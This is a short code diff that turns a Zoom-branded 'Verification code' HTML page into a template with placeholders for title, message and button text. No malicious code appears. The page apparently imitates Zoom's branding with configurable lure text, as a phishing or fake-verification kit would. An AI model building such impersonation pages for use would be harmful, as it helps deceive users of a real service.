@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Zoom · Verification code</title>
+    <title>{{TITLE}}</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
@@ -92,8 +92,8 @@
             <div class="zoom-logo-container">
                 <img class="zoom-combined-img" src="https://www.vectorlogo.zone/logos/zoomus/zoomus-ar21.svg" alt="Zoom">
             </div>
-            <h1>Verification code</h1>
-            <p>To verify your identity, enter the 6-character code below to connect to your account.</p>
+            <h1>{{TITLE}}</h1>
+            <p>{{MESSAGE}}</p>
         </div>
 
         <div class="card-body">
@@ -107,7 +107,7 @@
             <!-- Initial button (generates code) -->
             <button class="btn-primary" id="startBtn" onclick="generateCode()">
                 <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-                Get verification code
+                {{BUTTON_TEXT}}
             </button>
 
             <!-- Code panel (hidden until code is generated) -->
